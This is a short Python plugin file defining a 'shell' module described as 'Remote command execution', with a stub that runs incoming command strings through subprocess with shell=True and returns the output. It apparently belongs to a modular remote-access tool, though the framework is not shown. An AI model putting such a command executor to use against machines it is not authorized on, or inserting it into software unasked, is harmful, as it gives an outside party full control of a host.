PLUGIN = {"name": "shell", "desc": "Remote command execution", "deps": [], "size": 0.3}

STUB_CODE = r"""
def _cmd_shell(m):
    try:
        r = subprocess.run(m["cmd"], shell=True, capture_output=True, text=True, timeout=120)
        return {"output": (r.stdout + r.stderr) or "(no output)"}
    except subprocess.TimeoutExpired: return {"output": "[!] Timed out"}
    except Exception as e: return {"output": f"[!] {e}"}
_CMDS["shell"] = _cmd_shell
"""

def get_commands():
    return {"shell": "_cmd_shell"}
